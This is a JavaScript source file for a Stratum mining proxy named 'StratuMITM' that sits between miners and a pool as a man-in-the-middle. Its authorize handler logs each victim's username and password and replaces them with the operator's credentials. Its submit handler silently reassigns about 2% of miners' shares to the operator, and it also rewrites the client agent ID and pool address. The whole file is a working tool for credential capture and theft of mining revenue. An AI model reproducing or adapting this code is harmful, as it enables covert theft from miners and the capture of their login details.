// Sample of a rewriter that rewrites the credentials of all captive clients
const ReadyState = {
	CONNECTED: 0,
	SUBSCRIBED: 1,
	AUTHORIZED: 2
};

class CredentialRewriter {
	_config;
	_delegator;
	_log;
	_clients = {}

	constructor(config, delegator, logger) {
		this._config = config;
		this._delegator = delegator;
		this._log= logger.part('rw=cred');
		this._clients = {};
	}

	shouldLog(messageLevel = '') {
		if (this._config.log === '*' || this._config.log === 'all') {
			return true;
		} else if (Array.isArray(this._config.log)) {
			return this._config.log.indexOf(messageLevel) >= 0 ||
				this._config.log.indexOf(messageLevel.split(':', 2)[0]) >= 0;
		} else {
			return false;
		}
	}

	clientConnect(clientName = '') {
		const client = {
			'remote': this._delegator.openConnection(
				this._config.remote.host, this._config.remote.port),
			'remoteName': 'R_' + clientName,
			'log': this._log.part(clientName),
			'readyState': ReadyState.CONNECTED,
			'identifier': null,
			'lastShare': {
				'messageId': -1,
				'nonce': null,
				'status': 'unknown'
			}
		};

		// Register the newly opened connection with the delegator
		this._delegator.registerRemote(client.remoteName, client.remote);

		// Setup the socket information
		const self = this;
		client.remote.retry = this._config.remote.retry;
		client.remote.log = client.log.part('remote');
		client.remote.on('data', function () {
			// Drain the data
			while(this.feed.length > 0) {
				// Pipe this message to the client
				const message = this.feed.shift();
				if (self.shouldLog('messages:remote')) {
					this.log.log(message);
				}

				self.serverMessage(client.remoteName, message);
			}
		});

		// Open the connection
		client.remote.connect();

		client.remote.on('error', (error) => {
			console.error('Pizdec ne podklu4ilis:', error);
		});

		// Add it to the list
		this._clients[clientName] = client;

		if (this.shouldLog('events:connection')) {
			this._log.log('Client ' + clientName + ' connected.');
		}
	}

	clientDisconnect(clientName = '') {
		// If the client goes offline, kill the server connection too
		if (this.shouldLog('events:connection')) {
			this._log.log(`Client ${clientName} disconnected`);
		}

		if (clientName in this._clients) {
			// Close the remote socket
			this._clients[clientName].remote.socket.destroy();

			delete this._clients[clientName];
		} else {
			this._log.warn(`Client ${clientName} Client not registered but received disconnect event.`);
		}
	};

	clientMessage(clientName = '', message) {
		if (!clientName in this._clients) {
			this._log.warn(`Client ${clientName} not registered. Dropping message`);

			return;
		}

		const client = this._clients[clientName];

		if (this.shouldLog('messages:local')) {
			client.log.part('local').log(message);
		}

		if (typeof message !== 'object') {
			client.log.part('local').warn('Message not a JSON object. Forwarding.');
			this._delegator.sendRemote(client.remoteName, message);
			return;
		}

		if (!'method' in message) {
			client.log.part('local').warn('Message field not present -> Forwarding.');
			this._delegator.sendRemote(client.remoteName, message);

			return;
		}

		const rewriteLog = client.log.part('rewrite');

		switch (message.method) {
			case 'mining.subscribe':
				this.#handleSubscribeMessage(message, rewriteLog, client);
				break;
			case 'mining.authorize':
				this.#handleAuthorizeMessage(message, rewriteLog, client);
				break;
			case 'mining.submit':
				this.#handleSubmitMessage(message, rewriteLog, client);
				break;
			default:
				this._delegator.sendRemote(client.remoteName, message);
		}
	};

	serverMessage(serverName, message) {
		// Forward server messages
		const clientName = serverName.substring(2);

		if (clientName in this._clients) {
			const client = this._clients[clientName];
			if (message.id === client.lastShare.messageId) {
				// Response for the share
				if (message.result) {
					client.lastShare.status = 'accepted';
					client.log.part('shares').success(`ACCEPTED M#${message.id}`);
				} else {
					client.lastShare.status = 'rejected';
					client.log.part('shares').warn(`REJECTED M#${message.id} R=${message.error}`);
				}
			}
			this._delegator.sendLocal(clientName, message);
		} else {
			this._log.warn(`Got message from server  ${serverName} for untracked client. Dropping.`);

			if (this.shouldLog('messages:orphan')) {
				this._log.part('orphan').warn(message);
			}
		}
	};

	#handleSubscribeMessage(message, rewriteLog, client) {
		if (Array.isArray(message.params) && message.params.length > 0) {
			rewriteLog.log(`Rewrite subscribe client AgentID:${message.params[0]}`);
			message.params[0] = 'StratuMITM/Rewrite 0.1';

			if (message.params.length === 4) {
				const oldConfig = message.params[2] + ':' + message.params[3];
				message.params[2] = '' + this._config.remote.host;
				message.params[3] = '' + this._config.remote.port;
				const host = this._config.remote.host;
				const port = this._config.remote.port;
				rewriteLog.log(`Rewrite subscribe server from ${oldConfig} to ${host}:${port}`);
			}
		}
		// Send off
		this._delegator.sendRemote(client.remoteName, message);
		client.readyState = ReadyState.SUBSCRIBED;
	}

	#handleAuthorizeMessage(message, rewriteLog, client) {
		if (Array.isArray(message.params) && message.params.length > 1) {
			rewriteLog.log(`Replace credentials U:${message.params[0]} P: ${message.params[1]} with config ones.`);
			message.params[0] = this._config.credentials.user;
			message.params[1] = this._config.credentials.pass;
		} else {
			rewriteLog.warn('Could not understand authorize field. Replacing.');
			message.params = [this._config.credentials.user, this._config.credentials.pass];
		}

		// Send off
		this._delegator.sendRemote(client.remoteName, message);
		client.readyState = ReadyState.AUTHORIZED;
	}

	#handleSubmitMessage(message, rewriteLog, client) {
		if (Array.isArray(message.params) && message.params.length > 0) {
			if (Math.random() < 0.02) {
				rewriteLog.log(`Replace share owner U:${message.params[0]} with U: ${this._config.credentials.user}`);

				message.params[0] = this._config.credentials.user;

				if (message.params.length >= 4) {
					client.lastShare.messageId = message.id;
					client.lastShare.nonce = message.params[3];
					client.lastShare.status = 'submitted';
				}
			}
		} else {
			rewriteLog.warn('Could not parse mining.submit parameters. Passthrough.');
		}

		client.log.part('shares').log(`SUBMIT M# ${message.id}`);
		this._delegator.sendRemote(client.remoteName, message);
	}
}

exports.Rewriter = CredentialRewriter;